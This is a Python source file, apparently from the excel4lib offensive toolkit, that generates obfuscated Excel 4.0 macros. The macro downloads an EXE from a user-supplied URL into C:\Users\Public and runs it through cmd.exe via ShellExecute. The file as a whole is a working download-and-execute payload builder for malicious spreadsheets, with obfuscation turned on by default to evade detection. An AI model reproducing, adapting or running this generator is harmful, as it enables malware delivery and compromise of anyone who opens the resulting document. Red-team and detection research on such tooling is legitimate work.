import sys
from excel4lib.generator.generator import *
from excel4lib.lang import *

class Excel4DownloadExecuteGenerator(Excel4Generator):
    description = "Downloads and executes EXE file"
    name = "Excel4DownloadExecuteGenerator"

    def __init__(self, worksheet_name="DownloadExecute"):
        Excel4Generator.__init__(self, worksheet_name, Excel4Obfuscator(), desc=Excel4DownloadExecuteGenerator.description)

    def custom_args(self):
        '''
        Adds command line arguments to ArgumentParser
        :return:
        '''
        self.args_parser.add_argument("--url", "-u", required=False, help="URL from which download EXE file")

    def generate_macro(self):
        if not self.args.url:
            self.args_parser.error("--url argument is required")
            sys.exit(1)
        print("[*] Creating macro with URL {} ...".format(self.args.url))

        exe_path = self.macro.variable("exepath", "C:\\Users\\Public\\test.exe")
        download_call = self.macro.register_url_download_to_file_a("DOWNLOAD")
        self.macro.formula(download_call.get_call_name(), 0, self.args.url, exe_path, 0, 0)
        shell_arg = self.macro.variable("args", self.macro.argument("CONCATENATE", "/c ", exe_path))
        execute_call = self.macro.register_shell_execute("CMDRUN")
        self.macro.formula(execute_call.get_call_name(), 0, "open", "C:\\Windows\\System32\\cmd.exe", shell_arg, 0, 5)

        print("[*] Macro created")
        if not self.args.disable_obfuscation:
            Excel4Config.obfuscator.enable = True
            print("[*] Obfsucating macro with {} obfuscator ...".format(self.obfuscator.name))
        else:
            Excel4Config.obfuscator.enable = False
        print("[*] Saving output to {} ...".format(self.args.out))
        self.macro.to_csv_file(self.args.out)
        print("[*] Output saved to {}".format(self.args.out))
        print("[*] Trigger cords: column: {} row: {}".format(self.macro.trigger_x, self.macro.trigger_y))

    @staticmethod
    def run(args):
        '''
        Runs generator
        :param args: cli arguments
        :return:
        '''
        generator = Excel4DownloadExecuteGenerator()
        generator.init_args()
        if len(args) == 0:
            generator.args_parser.print_help()
            sys.exit(1)
        generator.parse(args)
        generator.generate()


if __name__ == '__main__':
    Excel4DownloadExecuteGenerator.run(sys.argv[1:])